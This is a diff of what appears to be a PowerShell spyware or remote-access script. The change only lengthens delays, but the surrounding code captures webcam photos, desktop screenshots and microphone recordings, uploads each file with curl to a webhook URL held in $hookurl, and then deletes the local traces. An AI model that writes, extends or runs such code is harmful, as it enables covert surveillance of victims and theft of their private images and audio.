@@ -892,7 +892,7 @@ Function TakePicture {
     [System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
     sleep 1
     curl.exe -F "file1=@$imagePath" $hookurl | Out-Null
-    sleep 1
+    sleep 3
     Remove-Item -Path "$env:TEMP\webcam.dll"
     Remove-Item -Path $imagePath -Force
 }
@@ -908,7 +908,7 @@ Function Screenshot {
     $mkvPath = "$env:Temp\ScreenClip.jpg"
     .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
     curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
-    sleep 1
+    sleep 3
     rm -Path $mkvPath -Force
 
 }
@@ -929,7 +929,7 @@ param ([int[]]$t)
     if ($t.Length -eq 0){$t = 10}
     .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $mp3Path
     curl.exe -F file1=@"$mp3Path" $hookurl | Out-Null
-    sleep 1
+    sleep 3
     rm -Path $mp3Path -Force
 }
 
